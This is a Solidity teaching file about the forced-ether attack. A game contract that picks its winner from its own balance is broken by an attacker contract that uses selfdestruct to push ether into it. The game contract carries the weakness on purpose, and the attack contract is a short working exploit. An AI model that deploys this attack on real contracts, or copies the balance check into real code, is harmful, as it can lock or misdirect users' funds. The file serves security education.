// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

/**
 * @notice
 * The Victim is a EthGame that select the 7th user that sends eth
 * The attacker breaks the contract flow with selfdestruct
 * 
 * Attacker target: break the contract condition to set the winner
 */

contract Victim { //or Attacker' Accomplice contract > fake winning game
    uint256 public targetAmount = 7 ether;
    address public winner;


    /**
     * @dev if we use msg.value instead of just checking the contract's balance, 
     * we can keep track only of the money sent with this call (deposit) 
     * and we can avoid bad actors to send money with call function 
     * breaking the set winner condition to claim rewards
    */
    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint256 balance = address(this).balance;  
       
        require(balance <= targetAmount, "Game is over");
        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent,) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

}

contract Attacker {
    Victim victim;

    constructor(Victim _victimAddress) {
        victim = Victim(_victimAddress); // used to send funds here after suicide and breakes the contract
    }

    function attack() public payable {
        address payable addr = payable(address(victim));
        selfdestruct(addr); 
    }

}
